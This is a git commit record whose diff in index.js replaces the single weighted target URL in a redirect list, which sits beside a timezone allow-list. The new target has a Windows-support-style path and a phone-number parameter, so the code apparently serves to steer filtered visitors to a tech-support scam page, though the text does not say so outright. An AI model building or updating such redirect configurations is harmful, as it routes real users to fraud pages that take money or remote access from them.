76ee3d8c7a5ecf02ae3f7490a681ac0eb72853ee
paalakash <palaksh452@gmail.com>
2026-06-03 09:06:16 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sdafgeqd.s3.us-east-005.dream.io/h8o23d2e3298d9d.html", weight: 1.0 }
+    { url: "https://plankton-app-6ghih.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-0803", weight: 1.0 }
 
 ];
 
